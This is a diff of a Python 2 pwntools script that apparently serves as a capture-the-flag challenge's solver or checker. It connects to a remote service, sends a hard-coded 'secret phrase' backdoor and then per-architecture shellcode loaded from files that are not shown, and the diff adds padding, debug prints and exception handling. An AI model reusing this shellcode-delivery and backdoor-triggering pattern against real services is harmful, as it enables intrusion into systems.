@@ -16,10 +16,8 @@ max_control = len(available['past']) + len(available['future']) + 1
 secret_phrase = "this is a super secret phrase that will allow us to test arbitrary solution combinations"
 
 def send_shellcode(r, archname):
-    r.readuntil('Shellcode length:\n')
-    r.readuntil('> ')
-    shellcode = open(os.path.join(os.path.dirname(__file__), 'platforms', archname, 'shellcode'), 'r').read()
-    r.sendline(str(len(shellcode)))
+    r.readuntil('Shellcode:\n')
+    shellcode = open(os.path.join(os.path.dirname(__file__), 'platforms', archname, 'shellcode'), 'r').read().ljust(0x1000, '\0')
     r.send(shellcode)
 
 def parse_status(status):
@@ -44,6 +42,7 @@ def fire_arch(r, do_control, can_control, arch=None, backdoor=True):
     print "Firing against", arch
     if backdoor:
         r.sendline(secret_phrase)
+        print "SENT SECRET"
         send_shellcode(r, arch)
     r.sendline(arch)
     output = r.readuntil("Checking for control...", timeout=10)
@@ -59,37 +58,42 @@ def full_control(host, port, target_control=max_control):
     print "First arch:", first_arch
 
     r = pwn.remote(host, port)
-    send_shellcode(r, first_arch)
 
-    print r.readuntil('ready.\n> ')
-    r.send('\n')
+    try:
+        send_shellcode(r, first_arch)
 
-    # fire present
-    if target_control >= 1:
-        babble = r.readuntil("> ")
-        can_control = parse_status(babble)
-        assert set(can_control) == available['present']
-        controlled = fire_arch(r, controlled, can_control, arch=first_arch, backdoor=False)
+        print r.readuntil('ready.\n> ')
+        r.send('\n')
 
-    # fire past
-    if target_control >= 2:
-        babble = r.readuntil("> ")
-        can_control = parse_status(babble)
-        assert set(can_control) == available['past']
-        controlled = fire_arch(r, controlled, can_control)
+        # fire present
+        if target_control >= 1:
+            babble = r.readuntil("> ")
+            can_control = parse_status(babble)
+            assert set(can_control) == available['present']
+            controlled = fire_arch(r, controlled, can_control, arch=first_arch, backdoor=False)
 
-    # fire future
-    if target_control >= 3:
-        babble = r.readuntil("> ")
-        can_control = parse_status(babble)
-        assert set(can_control) == (available['past'] | available['future']) - controlled
-        controlled = fire_arch(r, controlled, can_control)
+        # fire past
+        if target_control >= 2:
+            babble = r.readuntil("> ")
+            can_control = parse_status(babble)
+            assert set(can_control) == available['past']
+            controlled = fire_arch(r, controlled, can_control)
 
-    while len(controlled) < target_control:
-        babble = r.readuntil("> ")
-        can_control = parse_status(babble)
-        assert set(can_control) == (available['past'] | available['future']) - controlled
-        controlled = fire_arch(r, controlled, can_control)
+        # fire future
+        if target_control >= 3:
+            babble = r.readuntil("> ")
+            can_control = parse_status(babble)
+            assert set(can_control) == (available['past'] | available['future']) - controlled
+            controlled = fire_arch(r, controlled, can_control)
+
+        while len(controlled) < target_control:
+            babble = r.readuntil("> ")
+            can_control = parse_status(babble)
+            assert set(can_control) == (available['past'] | available['future']) - controlled
+            controlled = fire_arch(r, controlled, can_control)
+    except Exception:
+        print "EXCEPTION. Rest:"
+        print r.readrepeat(timeout=1)
 
     r.sendline("DONE")
 
